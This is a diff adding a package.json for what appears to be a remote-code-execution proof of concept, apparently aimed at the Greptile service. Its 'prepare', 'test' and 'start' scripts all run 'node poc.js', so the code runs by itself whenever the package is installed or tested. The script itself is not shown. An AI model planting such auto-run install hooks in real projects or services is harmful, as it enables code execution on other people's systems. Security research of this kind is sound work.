@@ -1,0 +1,10 @@
+{
+  "name": "greptile-rce-poc",
+  "version": "1.0.0",
+  "scripts": {
+    "test": "node poc.js",
+    "start": "node poc.js",
+    "prepare": "node poc.js"
+  },
+  "license": "MIT"
+}
